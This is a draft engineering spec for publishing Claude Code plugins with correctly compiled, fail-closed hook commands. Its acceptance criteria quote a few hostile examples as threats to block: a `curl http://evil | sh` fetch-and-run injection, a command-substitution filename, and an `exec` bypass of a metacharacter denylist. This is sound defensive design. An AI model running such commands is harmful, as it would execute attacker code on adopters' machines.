# Spec: Claude-plugin route — hook parity

- **Status:** Draft <!-- Draft | Approved | Implementing | Shipped | Archived -->
- **Owner:** eugenelim
- **Plan:** [`plan.md`](plan.md)
- **Constrained by:** [ADR-0002](../../adr/0002-install-scope-per-pack-default-and-allowance.md) (scope is a per-pack default + allowance), [ADR-0072](../../adr/0072-derived-plugin-manifest-mirrors-upstream-schema.md), [RFC-0008](../../rfc/0008-claude-plugins-install-route-parity.md)
- **Contract:** `contracts/adapter.toml`, `contracts/adapter.schema.json`, `contracts/plugin-manifest.derived.schema.json`
- **Shape:** integration
- **Blocked on:** a spike. Five review rounds produced three successive
  command-rewrite mechanisms, each broken in a way only execution revealed
  (`str.replace` cannot close a quote; `shlex.quote` emits single quotes that
  suppress `${CLAUDE_PLUGIN_ROOT}` expansion; positional splice corrupts
  `sh -c "…"` and unanchored matches). The remaining open questions are the same
  shape and will not be settled in prose.
- **Depends on:** [`../claude-plugin-route-scope/spec.md`](../claude-plugin-route-scope/spec.md),
  which split out the scope filter and the docs fix — those were shippable and
  survived rounds 4 and 5 unchallenged. Scope correctness must land first: it
  determines which packs the compiler ever runs for.

> **Split note (2026-08-07).** Scope correctness (the publish filter) and the
> documentation fix moved to the sibling spec above and are no longer criteria
> here. What remains is the hook compiler. Open design questions carried from
> round 5, none yet resolved:
>
> - **The marker-emission gate.** Gating on "the published set contains a reader"
>   is undetectable without executing pack code, fires on any pack that merely
>   *mentions* the marker filename, and tests the wrong predicate (marketplace
>   composition, not what the adopter installed). Candidate: an explicit
>   `[pack.install] marker-reader = true` declaration, so a manifest stays a pure
>   function of its own pack.
> - **Publishable decision-events.** The event set admits `PreToolUse`,
>   `PermissionRequest`, `PermissionDenied`, and `Setup`, which return
>   allow/deny decisions — a published plugin could silently auto-approve tool
>   calls, and the marketplace entry structurally cannot disclose that a plugin
>   registers hooks at all (`verify.py` asserts `hooks` absent from entries).
>   Candidate: restrict the publishable set to non-decision events.
> - **Command constraint shape.** The metacharacter denylist is the wrong shape —
>   `python3 -c "exec(...)"` carries none of the banned characters. The matcher
>   criterion already adopted an allowlist grammar for this exact reason; the
>   command criterion should match it.
> - **Direct-route residual.** An adopter running `agentbundle install` on a
>   third-party catalogue pack reaches `merge_json` with the authored command
>   copied verbatim and no validator in the path. `lint_packs.py` is a repo gate
>   that never runs on an adopter's machine.

> **Spec contract:** this document defines what "done" means. The implementing
> PR must match this spec, or update it. Verification must be derivable from it.

## Objective

**The Claude-plugin route is a user-scope distribution channel. It should
publish only packs that permit user-scope install, say so in the docs, and carry
their hooks correctly.** Today it does none of the three.

A Claude plugin's code always lives in the adopter's global cache
(`~/.claude/plugins/cache/<marketplace>/<plugin>/<version>`). The `project` and
`local` install scopes record an *enablement pointer* in a repo settings file;
they do not place the plugin in the repo. `claude plugin install` defaults to
`--scope user`. There is no repo-scoped plugin install in the sense agentbundle
means by `repo` — confirmed: `~/.claude.json` carries 53 project entries and
none records plugin enablement.

Three defects follow.

**1 — the route publishes packs that forbid the only install it offers.**
Seven packs declare `allowed-scopes = ["repo"]`: `core`, `catalogue-curation`,
`governance-extras`, `iac-terraform`, `monorepo-extras`, `release-engineering`,
`user-guide-diataxis`. Six are published to `claude-plugins-dist` today
(`catalogue-curation` is already excluded, but by a hardcoded name, for an
unrelated operator-only reason). ADR-0002 defines `allowed-scopes` as a refusal
contract — a scope outside the set "is refused with stderr naming the pack and
the declared set". The route installs them at user scope anyway.

**2 — the docs and the site offer the route for packs that cannot use it.**
`README.md:32-35`, the repo's front door, tells adopters to run
`claude plugin install core@agent-ready-repo`. `web/src/pages/packs/[pack].astro:24`
and `web/src/pages/catalogue/index.astro:54` each build a
`claude plugin install <slug>@<marketplace>` command for **every** pack, with
`scope` available on the same object and unused — so the site currently offers a
plugin install for all seven repo-only packs.

**3 — authored hooks are published inert.** A pack shipping
`.apm/hook-wiring/` gets its wiring written to `<pack>/.claude/settings.local.json`
(a direct-install destination the plugin loader never reads) and its bodies to
`<pack>/tools/hooks/`, named by a command relative to the adopter's working
directory rather than the plugin root. `build/main.py` *assigns*
`derived["hooks"]` rather than merging, and the derived schema admits one event.

### What this ships, stated plainly

Defects 1 and 2 are adopter-visible and are the deliverable: seven packs stop
being published and stop being advertised as plugins.

Defect 3's fix activates no hook *today*, because `packs/core` is the only pack
shipping `.apm/hook-wiring/` and it is one of the seven. It is not speculative
work, though — it is the precondition for two things:

- **RFC-0008's install→adapt chain on this route.** The synthetic install-marker
  hook keeps being written for the 14 published packs, unchanged. Both readers of
  `.adapt-install-marker.toml` — `packs/core/.apm/hooks/session-start.py` and the
  `adapt-to-project` skill — live in `core`, so on this route the *automatic
  nudge* is reachable only for an adopter who also has `core` installed at repo
  scope (the normal case, since `core` is the pack you install into a repo). The
  user-scope path re-lights the moment a user-capable pack ships a session-start
  hook, and this spec is what makes such a hook work at all.
- **Any future user-scoped pack's hooks.** Without this, the route silently drops
  them the day one is authored.

RFC-0008 is therefore **dormant on the user-scope path, not falsified**, and
takes no erratum. The spec records the dormancy where the route is documented.

Pack scopes are **not** changed to make any of this work. `packs/core` stays
`allowed-scopes = ["repo"]`; repo-scoped packs are repo-scoped deliberately, and
adopters reach them through the direct adapter, which is the route built for it.

## Boundaries

### Always do

- Fix the generator, the contract, the publish filter, and the docs; never
  hand-edit projected output.
- Derive the publish filter from `allowed-scopes`, not from a name list.
- Keep the derived manifest inside what Claude Code documents (ADR-0072:
  upstream wins; a local departure must be *restrictive*).
- Fail loud at build time, naming pack, wiring file, and command.
- Verify with the real `claude` client (2.1.223).

### Ask first

- **Widening any pack's `allowed-scopes`.** After AC1 that is a decision to
  publish that pack's code and hooks to a public marketplace, not a metadata
  tweak. Owner approval, every time.
- Changing the interpreter a pack's hook commands invoke (`python` vs `python3`;
  bare `python` is absent on stock macOS). Pre-existing on every route.

### Never do

- **Change any pack's `default-scope` or `allowed-scopes`.** If a pack's reach
  is wrong, that is a separate, owner-approved decision. Not a lever this spec
  pulls.
- Change what `packs/core` authors — events, interpreters, or hook bodies.
- Emit a hook the pack did not author, or register one twice.
- Widen `additionalProperties: false` on a manifest schema to make a new shape
  validate.
- Change the direct, self-host, or APM routes' projections.
- Add a third-party dependency (`pyproject.toml` `dependencies = []`).

### Precondition — partially satisfied

ADR-0072 records branch protection on `claude-plugins-dist` as a precondition
for publishing live code. Force-push and deletion are now denied (applied
2026-08-07; `enforce_admins: false` for owner recovery; no PR requirement, as the
branch is machine-published and `publish_claude_plugins.py` does a plain
fast-forward push). **Ordinary pushes remain unrestricted**, so ADR-0072's named
threat — anyone with repo write, or any workflow holding `contents: write` — is
narrowed, not closed. Tracked in `plan.md` Risks.

## Decision — where compiled hooks land

Claude Code accepts plugin hooks in `hooks/hooks.json` or inline in the
manifest's `hooks` field, and hooks from every source *accumulate* — so emitting
both would register each hook twice.

**Chosen: inline in the manifest**, merged with the install-marker entry. It is
the mechanism already shipping and real-client-verified on this route; one
registration site makes double-fire structurally impossible; the pre- and
post-write validation in `build/main.py` already guards it.

Rejected: `hooks/hooks.json` — better-documented and checked by name by
`claude plugin validate`, but it splits the surface across two files whose
combination rule the docs state only as "own merge rules".

Not chosen, recorded: exec form (`args` array). The pack-authored `command` is a
single string; `args` would require pack authors to restructure their wiring.
AC7's quoting discipline is what makes shell form safe.

## Acceptance Criteria

### Scope correctness

- [ ] **AC1 — The route publishes only user-capable packs.** A pack reaches
  `dist/claude-plugins/` and either `marketplace.json` only when its
  `[pack.install] allowed-scopes` contains `"user"`. Derived from the
  declaration, not a name list.

  `catalogue-curation`'s existing operator-only exclusion is **retained
  alongside** the derived predicate, not replaced by it. It drops today for a
  different reason than being repo-only, and folding the two would silently
  re-publish it if its scopes were ever widened.

- [ ] **AC2 — The seven excluded packs are named, so the set cannot drift.**
  `core`, `catalogue-curation`, `governance-extras`, `iac-terraform`,
  `monorepo-extras`, `release-engineering`, `user-guide-diataxis` appear in
  neither `dist/claude-plugins/` nor either `marketplace.json`. Asserted by name.

- [ ] **AC3 — The filter is enforced where the artifact is built, not only where
  it is published.** A repo-only pack reaching the `per-pack-claude-plugin`
  recipe is skipped with a build-time log naming the pack and its declared
  scopes. A filter living only in the publish script leaves `render`,
  `install --emit-install-routes`, `diff`, and `init-state` emitting artifacts
  the route will not carry.

### Documentation and site

- [ ] **AC4 — The site offers the plugin route only where it applies.**
  `web/src/pages/packs/[pack].astro` and `web/src/pages/catalogue/index.astro`
  gate the `claude plugin install` command on the pack's scope admitting `user`.
  Both files already carry `scope` on the same object; neither reads it. A
  repo-only pack's page shows the `agentbundle install` route only, with a
  one-line reason.

- [ ] **AC5 — Prose docs stop advertising the route for repo-only packs.**
  At minimum: `README.md:32-35` (front door — currently
  `claude plugin install core@agent-ready-repo`);
  `docs-site/src/content/docs/getting-started/install.md:64-71` (same, for
  `core`); `guides/_shared/explanation/install-routes.md:7` (presents the plugin
  route with no scope caveat);
  `guides/_shared/explanation/pack-catalogue.md:60` (claims "the same pack
  content reaches you via … `/plugin install`" — now false for seven packs);
  `guides/core/how-to/adapt-to-project.md:53` (lists `/plugin install` as a
  route for `core` itself).

  The route table in `install-routes.md` gains the scope precondition, so the
  rule is stated once where adopters choose a route. The implementing task
  re-derives this list by grep rather than trusting it.

- [ ] **AC6 — Adopter-facing disclosure of a breaking change.** Six packs
  disappear from a marketplace they are in today; adopters who installed any of
  them find it gone on their next marketplace update. `[Unreleased]` entries in
  `packages/agentbundle/CHANGELOG.md` and `docs/product/changelog.md` name the
  removal, name the packs, and state the remedy — install at repo scope with
  `agentbundle install`, the route they were always scoped for.

### Hook parity

- [ ] **AC7 — Authored wiring reaches the manifest.** For a user-capable pack
  shipping `.apm/hook-wiring/*.toml`, the derived `plugin.json` `hooks` object
  contains every authored event and entry, merged with the synthetic
  install-marker entry — marker first, then authored entries in sorted
  wiring-filename order. Asserted against a fixture pack, since no shipped pack
  qualifies today.

- [ ] **AC8 — Merge, not overwrite, in both directions.** The install-marker
  entry is present whether or not the pack authors `SessionStart`; authored
  `SessionStart` entries survive. A pack with no `hook-wiring/` produces a
  manifest byte-identical to today's.

- [ ] **AC9 — Bodies at a plugin-root path.** `hook-body` projects to
  `<pack>/hooks/<name>.{sh,py}` via a new `plugin-target-path`;
  `<pack>/tools/hooks/` is not emitted. The direct route is unchanged.

- [ ] **AC10 — Commands resolve against the plugin root, by anchored,
  quote-aware positional splice.** Each occurrence of
  `<repo-hook-prefix><name>` is replaced **in place in the original command
  string** by a double-quoted `"${CLAUDE_PLUGIN_ROOT}/<plugin-hook-prefix><name>"`,
  leaving operators, pipes, and redirections untouched. An optional leading `./`
  is absorbed.

  - **Anchored.** Rewritten only when preceded by start-of-string, whitespace,
    `=`, or a quote. `vendor/tools/hooks/x.py` raises under AC11 rather than
    splicing into a broken path.
  - **Quote-aware.** An occurrence already inside a double-quoted region — as in
    `sh -c "python tools/hooks/x.py"` — is emitted *without* added quotes;
    inserting them closes the outer quote and reintroduces word splitting.
  - **Double quotes, not single.** `shlex.quote` emits single quotes, inside
    which `sh` does not expand `${CLAUDE_PLUGIN_ROOT}` at all.

  Two mechanisms are forbidden, each shown by execution to corrupt the command:
  `str.replace` on the prefix (cannot emit the closing quote; the half-quoted
  result re-pairs across `&&`), and `shlex.split` + rejoin (destroys operators).

  **Verification is execution.** The emitted command runs through `sh -c` with
  `CLAUDE_PLUGIN_ROOT` set to a path containing a space and a `$`, and the hook's
  observed `argv` must show the path as exactly one argument. A `shlex.split`
  round-trip assertion is not acceptable evidence — it cannot fail.

- [ ] **AC11 — Fail closed on an unrewritable or dangling command**, evaluated
  **per fragment**: every whitespace- or `=`-delimited fragment naming the
  basename of a shipped hook body must itself carry `${CLAUDE_PLUGIN_ROOT}` after
  rewriting, else raise. A per-command check passes a command where only one of
  two paths matched. Separately, each rewritten path must `resolve()` to a
  location `relative_to` the pack's hook-body source directory — confinement, not
  `exists()`.

- [ ] **AC12 — Hook-body basenames are validated, not escaped.** Each basename
  must `fullmatch` `^[A-Za-z0-9][A-Za-z0-9._-]*$`. Inside the double quotes AC10
  mandates, `sh` still interprets `` ` ``, `$(`, `\`, and `"`, so a body named
  ``a`id`.py`` would run command substitution on every hook fire. Mirrors the
  existing `install-marker.py` `_assert_portable_name` precedent.

- [ ] **AC13 — Only `command` hooks are published.** A hook whose `type` is not
  `"command"` raises with the same locating detail. House convention for every
  adapter that *transforms* wiring: `copilot` and `gemini` both raise; `cursor`
  is the fail-open outlier that drops with a log. This route transforms, so it
  fails closed, and raises rather than drops because a dropped hook on a
  published artifact is invisible.

- [ ] **AC14 — Event names validated in the compiler; the schema validates
  shape.** The compiler holds the documented event set and raises on an unknown
  event, naming pack, file, and event. The schema uses
  `hooks: {additionalProperties: <entry-array schema>}` — `build/validate.py`
  supports neither `$ref` nor `propertyNames`, so a closed enum there would mean
  one longhand copy per documented event across two mirrored files.

  **Per-adapter scoping:** `.apm/hook-wiring/` is shared by every adapter.
  Kiro's lowercase `agent-event-vocabulary` (`agentSpawn`, `userPromptSubmit`, …)
  and the flat user-scope Claude shape (top-level `command`, no `type`) are
  contract-supported and must be **skipped, not raised on** — this compiler
  validates only entries in the Claude PascalCase nested shape.

  **Widening procedure:** an event joins the set only when present in Claude
  Code's published hook documentation at a named client version *and* an AC18
  real-client run is recorded.

- [ ] **AC15 — Bounded hook cost.** The compiler raises on a `timeout` outside
  1–60s (60 is Claude Code's documented default; a lower ceiling is a
  *restriction*, permitted under ADR-0072) and on a `matcher` that does not
  `fullmatch` `^\^?[A-Za-z0-9_-]+(\|[A-Za-z0-9_-]+)*\$?$` — literal tool names,
  optional anchors, no quantifiers.

  An allowlist grammar, not a shape heuristic: deciding "nested unbounded
  quantifiers" needs a regex AST, `agentbundle` is stdlib-only, and a textual
  heuristic is evaded by `(?:a+)+` and `(a|ab)*$`. A bypassable check that reads
  as a control is worse than none.

- [ ] **AC16 — A pack with wiring but no source manifest raises.**
  `build/main.py` gates manifest synthesis on `plugin.json` existing; such a pack
  must raise naming the pack, not silently drop its hooks.

- [ ] **AC17 — No dead artifact.** The route emits no `<pack>/.claude/`.

### Verification and hygiene

- [ ] **AC18 — Real-client verification.** `claude plugin validate` passes on a
  built user-capable pack; `claude plugin details` reports the exact registered
  hook set — event names, entry count, command strings — plus one observed side
  effect of an authored hook firing, and the observed execution model (parallel
  or sequential) for AC7's ordering rationale. Separately, a dropped pack is
  confirmed absent from the marketplace. Transcripts recorded in `plan.md`.

- [ ] **AC19 — Idempotent.** Warm and cold rebuilds produce byte-identical
  `plugin.json`.

- [ ] **AC20 — Other routes unchanged; every changed consumer named.**
  `build/self_host.py` (direct via `project_packs`), `commands/pack_evals.py`,
  and the APM recipe emit output byte-identical to pre-change. **Six consumers
  run the `per-pack-claude-plugin` recipe via `render_pack` and change by
  design:** `commands/render.py`, `commands/install.py --emit-install-routes`,
  `commands/upgrade.py`, `commands/diff.py`, `commands/validate.py`, and
  `commands/init_state.py` — the last writes rendered relpaths into the state
  file, so every `init-state` run records a different set after this change.
  Asserted per projection.

- [ ] **AC21 — Contract bumped and mirrored.** `contracts/adapter.toml` bumps
  `[contract].version`, declares `plugin-target-path` on `hook-body` and
  `plugin-mode` on `hook-wiring`, byte-identical to the `_data/` mirror.
  `adapter.schema.json` constrains `plugin-mode`'s **value** to the `mode` enum;
  a misspelled *key* is caught by the contract task's value assertion, not the
  schema (the projection-array item has no `additionalProperties: false`). Living
  docs stating the version are updated: `docs/architecture/overview.md`,
  `pack-layout.md`, `agentbundle.md`, and `packages/agentbundle/DESIGN.md` (×2).

- [ ] **AC22 — Pack-source gate.** `build/lint_packs.py` validates every
  Claude-shaped `.apm/hook-wiring/*.toml` at authoring time, calling the same
  validators the compiler uses so the two cannot disagree, and converting each
  raise into a finding string rather than aborting the sweep.

- [ ] **AC23 — Frozen spec superseded by erratum, not edited.**
  `docs/specs/wire-session-start-hook/spec.md` is `Status: Shipped` and pins the
  `claude-plugins/<pack>/.claude/settings.local.json` layout throughout. It
  receives an erratum recording that AC17 supersedes that layout and that its
  subject pack (`core`) no longer publishes to this route at all. The body is not
  edited.

### Round-4 additions

- [ ] **AC24 — All three marketplace/artifact writers share one predicate.**
  AC1's filter applies at the recipe, at the dist aggregation, **and at
  `build/self_host.py:_aggregate_marketplace`**, which writes the repo-root
  `.claude-plugin/marketplace.json` that `claude plugin marketplace add
  eugenelim/agent-ready-repo` actually resolves. That function carries a contrary
  design note ("intentionally ignores the pack filter — the catalogue advertises
  every pack"); this spec overturns it, and says so at the note.

  The two writers have **already drifted**: `catalogue-curation` is listed in the
  repo-root marketplace today and is absent from `origin/claude-plugins-dist`.
  Leaving an entry whose `source.path` no longer exists on the branch turns a
  clean "not offered" into a dangling fetch. ADR-0072 records this same function
  as the writer missed last time.

- [ ] **AC25 — The predicate's absent-declaration rule is explicit.** A pack with
  no `[pack.install]` table resolves to `["repo"]`, matching
  `commands/validate.py:_allowed_scopes`, which is **reused, not re-derived**.
  Several test fixtures omit the table; each fixture whose tests assert
  claude-plugins output declares `allowed-scopes = ["repo", "user"]` explicitly
  rather than relying on a default.

- [ ] **AC26 — Rail B's consent gesture is part of the qualifying shape.**
  `build/scope_rails.py:check_hooks` refuses a pack declaring `"user"` while
  carrying `.apm/hooks/` or `.apm/hook-wiring/` unless it also sets
  `[pack.install] user-scope-hooks = true`. AC7's fixture and AC18's subject pack
  therefore declare both `allowed-scopes ∋ "user"` and that flag; without it they
  fail `agentbundle validate`. The flag is the author's explicit "yes, my hooks
  land on the adopter's machine outside per-project isolation" — exactly the
  consent this route needs.

- [ ] **AC27 — The site gates on a field derived from `allowed-scopes`.** The
  existing `scope` field in `web/src/content.config.ts` is populated from
  `default-scope` (`tools/build-site.py:67`), not `allowed-scopes` — so gating on
  it would hide `product-documentation` (`default-scope = "repo"`,
  `allowed-scopes = ["repo","user"]`), which AC1 publishes. A new derived field
  carries user-capability, and AC4 gates on that.

- [ ] **AC28 — Authored command strings are mechanically constrained.** The
  shared validator raises on a `command` containing `` ` ``, `$(`, `;`, `&`,
  `|`, `>`, `<`, or a newline outside the rewritten path.

  This spec is what makes authored commands *execute* on this route — they are
  published inert today — so the diff introduces the boundary crossing. AC10-AC12
  close splice *corruption*, not authoring: `python tools/hooks/x.py; curl
  http://evil | sh` satisfies all three and publishes verbatim. "Trusted modulo
  PR review" is not sufficient once `assimilate-repo` and
  `propose-catalogue-pack` make third-party pack content a reachable source.

- [ ] **AC29 — AC11's predicate is relative-path-shaped, not basename-shaped.**
  Any fragment that is a relative path — contains `/`, no leading `/`, no
  `${CLAUDE_PLUGIN_ROOT}` after rewriting — raises. Strictly stronger than the
  basename reading and drops its ambiguity: under basename equality
  `vendor/tools/hooks/x.py` neither rewrites (AC10 declines it, unanchored) nor
  raises, publishing a relative path that `sh` resolves against the adopter's
  working directory at hook-fire time.

  Separately, an occurrence inside a **single-quoted** region raises: `sh` does
  not expand `${CLAUDE_PLUGIN_ROOT}` there, so the hook silently never runs while
  AC11's textual check passes — the invisible-dropped-hook outcome AC13 refuses.

- [ ] **AC30 — The lint dry-runs the full compiler, on every wiring pack.**
  AC22's shared validators exclude AC10's splice and AC11's completeness and
  confinement checks — and AC3 guarantees a repo-only pack never reaches the
  compiler, so `packs/core`'s wiring, the only real wiring in the tree, would be
  the one wiring those checks never run against. The lint therefore dry-runs
  `compile_plugin_hooks` against **every** pack shipping `.apm/hook-wiring/`,
  publishable or not, converting each raise to a finding.

- [ ] **AC31 — Matcher grammar drops the anchors.**
  `^[A-Za-z0-9_-]+(\|[A-Za-z0-9_-]+)*$` — bare literal alternations only.
  `^Bash|Edit$` parses as `(^Bash)|(Edit$)`, which matches `BashTool` and
  `MyEdit` and misses `EditFile`, firing a hook on tools it was not scoped to.
  AC14's widening procedure applies to this grammar too.

- [ ] **AC32 — Delisting is not revocation.** AC6's remedy names
  `claude plugin uninstall <pack>@agent-ready-repo` as step one: the filter
  removes the marketplace entry and the branch directory but uninstalls nothing,
  so an adopter keeps running a pinned, permanently-unmaintained copy whose
  install-marker hook keeps firing — and following the remedy without
  uninstalling leaves two unrelated copies of the pack's skills. AC18 gains an
  install-then-delist run recording what the client actually does to an
  installed-but-delisted plugin.

- [ ] **AC33 — The install-marker hook ships only when a reader exists.** The
  synthetic `SessionStart` install-marker entry is emitted into a pack's manifest
  only when at least one pack in the published set ships a marker *reader*.
  Today none does, so the 14 published plugins ship with an empty `hooks` block
  and AC8's "marker present whether or not the pack authors `SessionStart`"
  applies only under that condition.

  **Why reader-existence and not "this pack ships hooks".** RFC-0008's writer is
  per-pack self-announcement — each plugin's marker says *this pack was just
  installed* — while the reader is separate and singular. Gating on the pack's
  own hook block would stop hookless packs announcing themselves, which is a real
  regression the day a reader appears. Reader-existence is the condition that is
  correct both now and then.

  **What it buys.** Today every published plugin runs a Python subprocess at
  every session start to write a file nothing reads. That stops.

  **What it costs.** A pack's manifest now depends on the composition of the
  published set: adding a reader pack changes the other manifests. The build is
  deterministic over that set and AC19's idempotency assertion covers it, but the
  coupling is real and is recorded here rather than discovered later.

## Testing Strategy

- **Unit** — the scope predicate over a matrix of `allowed-scopes` values; the
  compiler's merge, ordering, anchored/quote-aware rewriting, per-fragment AC11,
  basename validation, and each fail-closed raise; per-adapter skip for Kiro and
  flat-shape wiring.
- **Execution** — AC10's `sh -c` assertion with a space-and-`$` root.
- **Schema** — accepts a compiled multi-event block with and without `matcher`;
  rejects a non-`command` type and unknown keys.
- **Integration** — build the fixture packs; assert the seven exclusions by name,
  manifest hooks, `hooks/` bodies, absence of `.claude/` and `tools/hooks/`,
  byte-identical warm/cold rebuild, and the AC16 raise.
- **Site** — a repo-only pack's page renders no `claude plugin install` command;
  a user-capable pack's does. Asserted against built output, not source.
- **Regression** — a non-plugins build still emits `.claude/settings.local.json`
  and `tools/hooks/` (AC20).
- **Manual QA** — the real client, per AC18.

## Assumptions

- **Documented Claude Code hook events at 2.1.223** (`code.claude.com/docs/en/plugins-reference`,
  read 2026-08-07), the normative set for AC14: `SessionStart`, `Setup`,
  `UserPromptSubmit`, `UserPromptExpansion`, `PreToolUse`, `PermissionRequest`,
  `PermissionDenied`, `PostToolUse`, `PostToolUseFailure`, `PostToolBatch`,
  `Notification`, `MessageDisplay`, `SubagentStart`, `SubagentStop`,
  `TaskCreated`, `TaskCompleted`, `Stop`, `StopFailure`, `TeammateIdle`,
  `InstructionsLoaded`, `ConfigChange`, `CwdChanged`, `DirectoryAdded`,
  `FileChanged`, `WorktreeCreate`, `WorktreeRemove`, `PreCompact`, `PostCompact`,
  `Elicitation`, `ElicitationResult`, `SessionEnd`. The snapshot lands under the
  spec dir so a future widening can diff against it.
- `hooks/` at the plugin root is safe for hook *bodies*: Claude Code discovers
  `hooks/hooks.json` by exact name, not by globbing. AC18's exact-set assertion
  is what catches this being wrong.
- Pack-authored `command` strings are trusted input whose gate is PR review plus
  AC22's lint.

## Deferred

- `packs/core`'s hooks remain direct-route only. Nothing here makes them
  reachable by plugin, and nothing should: core is repo-scoped by design.
- Repo-scope hook-wiring moving from `.claude/settings.local.json` to the shared
  `.claude/settings.json` via RFC-0005's `user-merge-json`, so `claude-code`
  stops being the only adapter that hides repo-scope hooks from teammates —
  **follow-on RFC**.
- `claude-code` (direct) and `codex` accepting non-`command` hook types
  unvalidated.
- A per-pack content hash in the marketplace entry, so an installed plugin is
  traceable to the commit that produced it while `ref` stays mutable.
- A branch-integrity control compensating for unrestricted ordinary pushes to
  `claude-plugins-dist` (rebuild-and-compare, or a push ruleset).
